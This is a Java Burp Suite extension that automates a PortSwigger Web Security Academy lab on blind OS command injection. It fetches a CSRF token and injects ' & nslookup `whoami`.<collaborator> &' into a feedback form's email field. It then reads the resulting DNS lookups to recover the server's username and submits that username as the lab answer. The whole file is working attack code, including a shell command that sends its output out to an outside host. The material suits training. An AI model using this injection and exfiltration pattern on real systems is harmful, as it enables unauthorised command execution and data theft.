package labSolver;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.Interaction;

import java.net.CookieHandler;
import java.net.CookieManager;
import java.io.IOException;
import java.net.URL;
import java.net.HttpURLConnection;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.net.URLEncoder;
import java.io.OutputStream;
import java.util.List;
import java.nio.charset.StandardCharsets;


public class LabSolver implements BurpExtension {
    private MontoyaApi api;
    private String labUrl;
    private String csrfToken;
    private String payload;
    private String solution;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.labUrl = "https://0aab006a0405e73f84d1819600ac005b.web-security-academy.net/";
        CookieHandler.setDefault(new CookieManager());

        api.extension().setName("Lab: Blind OS command injection with out-of-band data exfiltration");

        CollaboratorClient collaboratorClient = createCollaboratorClient();
        String payload = collaboratorClient.generatePayload().toString();

        try {
            this.csrfToken = getCsrfToken();
            sendRequest(payload);
        } catch (IOException e) {
            e.printStackTrace();
            api.logging().logToOutput("Error: " + e.getMessage());
        }

        List<Interaction> interactionList = collaboratorClient.getAllInteractions();
        printExfiltratedData(interactionList);

        try {
            submitSolution();
        } catch (IOException e) {
            e.printStackTrace();
            api.logging().logToOutput("Error: " + e.getMessage());
        }

        api.extension().registerUnloadingHandler(() -> {
            api.logging().logToOutput("Extension unloading...");
        });
    }

    private CollaboratorClient createCollaboratorClient() {
        CollaboratorClient collaboratorClient;

        collaboratorClient = api.collaborator().createClient();

        return collaboratorClient;
    }

    private String extractCsrfToken(String responseBody) {
        Pattern pattern = Pattern.compile("value=\"(.*?)\"");
        Matcher matcher = pattern.matcher(responseBody);
        if (matcher.find()) {
            return matcher.group(1);
        }
        return null;
    }

    private String getCsrfToken() throws IOException {
        URL url = new URL(labUrl + "feedback");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");

        StringBuilder response = new StringBuilder();
        try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
        }

        csrfToken = extractCsrfToken(response.toString());
        return csrfToken;
    }

    private void sendRequest(String payload) throws IOException {
        String injectionPayload = URLEncoder.encode(" & nslookup `whoami`." + payload + " &");
        String data = "csrf=" + csrfToken + "&name=hacker&subject=hacker&message=hacker&email=hacker@hacker.com" + injectionPayload;
        URL url = new URL(labUrl + "feedback/submit");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("Content-Length", Integer.toString(data.length()));
        connection.setDoOutput(true);

        try (OutputStream os = connection.getOutputStream()) {
            os.write(data.getBytes());
            os.flush();
        }

        StringBuilder response = new StringBuilder();
        try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
        }

        this.payload = payload;
    }

    private void printExfiltratedData(List<Interaction> interactionList) {
        for (Interaction interaction : interactionList) {
            if (interaction.type().name().equalsIgnoreCase("dns")) {
                byte[] queryBytes = interaction.dnsDetails().get().query().getBytes();
                String dnsQuery = new String(queryBytes, StandardCharsets.UTF_8);
                String[] parts = payload.split("\\.");
                String[] dnsQueryParts = dnsQuery.split(parts[0]);
                this.solution = dnsQueryParts[0].substring(13, dnsQueryParts[0].length() - 1);
            }
            break;
        }
    }

    private void submitSolution() throws IOException {
        String data = "answer=" + solution.toString();
        URL url = new URL(labUrl + "submitSolution");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setRequestProperty("Content-Length", Integer.toString(data.length()));
        connection.setDoOutput(true);

        try (OutputStream os = connection.getOutputStream()) {
            os.write(data.getBytes());
            os.flush();
        }

        StringBuilder response = new StringBuilder();
        try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
        }

        api.logging().logToOutput(solution);
        api.logging().logToOutput(response.toString());
    }
}
